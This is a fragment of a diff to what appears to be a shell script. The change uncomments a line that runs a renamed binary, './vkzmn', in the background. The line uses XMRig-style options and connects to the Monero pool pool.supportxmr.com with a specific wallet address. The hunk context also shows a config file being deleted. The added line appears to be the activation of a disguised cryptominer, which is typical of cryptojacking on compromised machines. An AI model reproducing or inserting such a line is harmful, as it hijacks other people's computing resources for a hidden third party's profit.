@@ -28,7 +28,7 @@ rm config.json
 
 #use    #tls and por 9000    
 
-#./vkzmn  --url  pool.supportxmr.com:3333    --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1   &
+./vkzmn  --url  pool.supportxmr.com:3333    --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1   &
  
 
 
@@ -68,7 +68,6 @@ rm config.json
 
 #./vkzmn   --url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1  
  
-
 
 
 fi ; 
